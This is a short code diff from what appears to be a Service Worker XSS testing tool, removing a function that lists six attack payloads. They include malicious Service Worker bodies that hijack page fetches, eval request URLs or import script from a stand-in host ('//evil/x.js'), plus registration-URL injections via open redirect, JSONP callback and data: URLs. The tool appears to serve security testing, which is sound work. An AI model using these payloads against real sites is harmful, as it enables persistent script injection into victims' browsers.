@@ -344,17 +344,3 @@ def build_poc_html(target_url: str, sw_url: str) -> str:
 </script>
 </body></html>
 """
-
-
-def dangerous_payloads() -> list[str]:
-    """High-yield payloads for Service Worker XSS testing."""
-    return [
-        # SW script body payloads (used when serving a malicious SW)
-        "self.addEventListener('fetch',e=>e.respondWith(new Response('<script>alert(1)</script>',{{headers:{{'Content-Type':'text/html'}}}})));",
-        "self.addEventListener('fetch',e=>importScripts('//evil/x.js'));",
-        "self.addEventListener('fetch',e=>eval(e.request.url));",
-        # Registration URL payloads (when register() takes user input)
-        "/redirect?to=//evil/sw.js",
-        "//victim.example/jsonp?cb=self.addEventListener('fetch',e=>e.respondWith(new%20Response('<script>alert(1)</script>')))//",
-        "data:text/javascript,self.addEventListener('fetch',e=>e.respondWith(new Response('<img src=x onerror=alert(1)>',{headers:{'Content-Type':'text/html'}})));",
-    ]
